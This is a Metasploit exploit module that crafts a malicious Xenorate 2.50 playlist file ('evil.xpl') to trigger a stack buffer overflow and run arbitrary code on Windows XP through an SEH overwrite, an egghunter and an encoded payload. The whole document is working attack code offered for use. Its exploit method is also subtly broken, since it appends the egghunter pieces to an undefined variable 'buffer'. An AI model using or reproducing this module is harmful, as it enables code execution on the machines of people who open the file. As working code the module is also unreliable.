require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh
        include Msf::Exploit::Egghunter	
        
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Xenorate 2.50(.xpl) universal Local Buffer Overflow Exploit (SEH)',
			'Description'    => %q{
					This module exploits a stack overflow in Xenorate 2.50
					By creating a specially crafted xpl playlist file, an an attacker may be able
					to execute arbitrary code. 
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'loneferret, original by  germaya_x' ],
			'Version'        => '$Revision:  $',
			'References'     =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/10371' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},					
			'Payload'        =>
				{
					'Space'    => 5100,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'DisableNops'   =>  'True',
				},
			'Platform' => 'win',
			'Targets'        => 
				[
					[ 'Windows XP SP2 / SP3', { 'Ret' => 0x1000a4fd } ], # pop pop ret => bass.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Dec 10 2009',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME',   [ false, 'The file name.',  'evil.xpl']),
				], self.class)

	end

	def exploit

                # Unleash the Egghunter!
                eh_stub, eh_egg = generate_egghunter

		sploit = rand_text_alpha_upper(88)
		sploit << "\xEB\x06\x90\x90"
		sploit << [target.ret].pack('V')
		sploit << make_nops(20)
                buffer << eh_stub
                buffer << rand_text_alpha_upper(2000)		
                buffer << eh_egg * 2		
		sploit << payload.encoded
	
		xpl = sploit

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(xpl)   

	end

end
